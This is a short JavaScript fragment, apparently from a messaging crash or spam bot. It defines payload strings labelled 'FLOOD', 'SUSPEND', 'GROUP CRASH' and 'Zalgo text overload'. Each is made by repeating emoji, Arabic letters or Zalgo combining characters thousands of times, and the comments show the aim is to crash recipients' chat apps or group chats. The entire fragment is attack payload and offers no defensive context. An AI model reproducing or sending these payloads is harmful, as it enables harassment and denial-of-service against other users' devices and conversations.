    // 🥇 FLOOD - Mix of everything
    flood: ("😀🙂😉😊😇🥰😍🤩😘😗😚😋😛😜🤪😝🤑🤗🤭🤫🤔🤐🤨😐😑😶😏😒🙄😬🤥😌😔😪🤤😴😷🤒🤕🤢🤮🥴😵🤯🤠🥳🥸😎🤓🧐😕😟🙁😮😯😲😳🥺😦😧😨😰😥😢😭😱😖😣😞😓😩😫🥱😤😡😠🤬").repeat(150),
    
    // 🥇 SUSPEND - Large Unicode + emoji
    suspend: "ب ة ت ث ج ح خ د ذ ر ز س ش ص ض ط ظ ع غ ف ق ك ل م ن".repeat(2000) + "😀".repeat(4000),
    
    // 🥇 GROUP CRASH - Maximum payload
    groupCrash: ("😀".repeat(2000) + "ب ة ت ث ج ح خ د ذ ر ز س ش ص ض ط ظ ع غ ف ق ك ل م ن".repeat(1000)).repeat(2),
    
    // 🥇 SPECIAL - Zalgo text overload
    zalgoCrash: "H̷̷̷E̷̷̷L̷̷̷L̷̷̷O̷̷̷".repeat(3000),
